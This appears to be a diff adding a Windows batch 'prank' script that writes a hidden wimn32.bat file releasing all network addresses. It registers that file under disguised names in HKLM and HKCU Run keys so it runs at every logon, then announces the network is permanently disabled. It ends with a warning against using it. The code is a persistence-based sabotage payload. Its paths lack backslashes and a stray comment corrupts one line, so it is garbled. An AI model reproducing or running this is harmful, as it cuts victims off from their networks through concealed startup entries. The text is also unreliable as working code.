@@ -1,0 +1,18 @@
+echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat -- Hides the IP Address
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo Your Network has been Disabled Permently!
+
+PAUSE
+
+-- WARNING --
+Do not do this to anyone or you might be in trouble as this program cannot fix the damages which has been commited.
